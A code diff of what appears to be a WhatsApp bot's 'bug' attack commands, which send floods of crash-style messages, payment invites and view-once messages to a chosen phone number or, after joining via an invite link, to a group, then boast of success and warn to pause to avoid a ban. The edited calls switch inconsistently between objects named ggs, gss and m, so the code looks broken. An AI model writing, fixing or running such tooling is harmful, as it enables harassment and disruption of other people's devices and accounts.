@@ -44,9 +44,9 @@ const bugCommand = async (m, Matrix) => {
   };
   m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendVariousMessages(whatsappNumber, encodedAmount);
+  ggs.sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
@@ -77,10 +77,8 @@ break;
     return m.reply("The number is not registered on WhatsApp");
   };
   m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  m.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
@@ -101,11 +99,9 @@ break;
       return m.reply("Amount must be a number");
     };
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendMultiplePaymentInvites(from, encodedValue);
+    m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
+    gss.sendReaction('✅');
   };
   break;
     if (cmd === 'xandroid2') {
@@ -122,11 +118,11 @@ break;
       return m.reply("Amount must be a number");
     };
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
+    gss.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     await sleep(1500); // Adjusted sleep time for clarity
-    sendVariousMessages(from, encodedValue);
+    gss.sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
+    ggs.sendReaction('✅');
   };
   break;
     if (cmd === 'xgc') {
@@ -145,7 +141,7 @@ break;
       let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
       let groupTarget = await TogeBotInc.groupAcceptInvite(groupLink);
       await sleep(2000); // Adjusted sleep time for clarity
-      sendViewOnceMessages(groupTarget, bugAmount);
+      ggs.sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
       m.reply("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
       TogeBotInc.groupLeave(groupTarget);
@@ -179,9 +175,9 @@ break;
   };
   m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendMixedMessages(whatsappNumber, encodedAmount);
+  ggs.sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
@@ -213,9 +209,9 @@ break;
   };
   m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendRepeatedMessages2(whatsappNumber, encodedAmount);
+  gss.sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉", 
     [whatsappNumber]
